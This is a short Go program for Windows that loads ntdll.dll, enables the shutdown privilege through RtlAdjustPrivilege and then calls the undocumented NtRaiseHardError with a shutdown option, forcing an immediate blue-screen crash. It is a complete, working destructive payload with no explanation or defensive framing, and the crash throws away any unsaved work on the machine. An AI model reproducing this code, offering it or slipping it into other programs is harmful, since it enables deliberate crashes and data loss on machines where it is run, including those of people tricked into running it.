package main

import (
	"syscall"
	"unsafe"
)

var (
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	rtlAdjustPrivilege  = ntdll.NewProc("RtlAdjustPrivilege")
	ntRaiseHardError    = ntdll.NewProc("NtRaiseHardError")
)

func main() {
	var enabled bool
	var response uint32

	rtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&enabled)))
	ntRaiseHardError.Call(0xC0000420, 0, 0, 0, 6, uintptr(unsafe.Pointer(&response)))
}

